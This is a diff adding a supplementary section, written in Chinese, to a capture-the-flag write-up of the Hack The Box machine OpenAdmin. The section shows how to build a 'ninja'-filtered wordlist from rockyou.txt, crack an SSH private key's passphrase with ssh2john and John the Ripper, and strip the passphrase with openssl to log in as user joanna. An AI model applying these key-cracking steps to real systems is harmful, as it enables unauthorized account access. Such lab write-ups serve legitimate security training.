@@ -486,3 +486,38 @@ root
 
 # 总结
 总的来说还是简单的靶机，就是比较绕，有几次提权，要保持耐心。
+
+# 补充
+关于main.php里的这一句
+> Don't forget your "ninja" password
+
+意思是ssh私钥密码里包含了```ninja```的字样，可以用下面命令导出一个所有包含```ninja```的字典
+
+```grep -i ninja /usr/share/wordlists/rockyou.txt > rockyou_ninja```
+
+然后再根据这个字典爆破私钥，是可以爆破出来的。我之前用完整的rockyou.txt需要等很长的时间，我通常觉得爆个10分钟如果还不出来那大概这条路是不通的（仅仅针对这些靶机，真实环境不属此列）。
+```
+┌──(root💀kali)-[~/htb/OpenAdmin]
+└─# /usr/share/john/ssh2john.py id_rsa >rsacrack
+                                                                                                                                                                                                                                            
+┌──(root💀kali)-[~/htb/OpenAdmin]
+└─# john --wordlist=./rockyou_ninja rsacrack 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)
+1g 0:00:00:00 DONE (2021-12-23 21:13) 50.00g/s 88250p/s 88250c/s 88250C/s *69flyingninjamonkeys..#1FLUFFYCOCKYNINJA
+Session completed
+
+```
+
+根据密码，可以用openssl还原一个没有密码的私钥证书
+
+```openssl rsa -in id_rsa -out id_rsa_openadmin_joanna ```
+
+现在就可以用```id_rsa_openadmin_joanna```无密码登陆```joanna```的账号
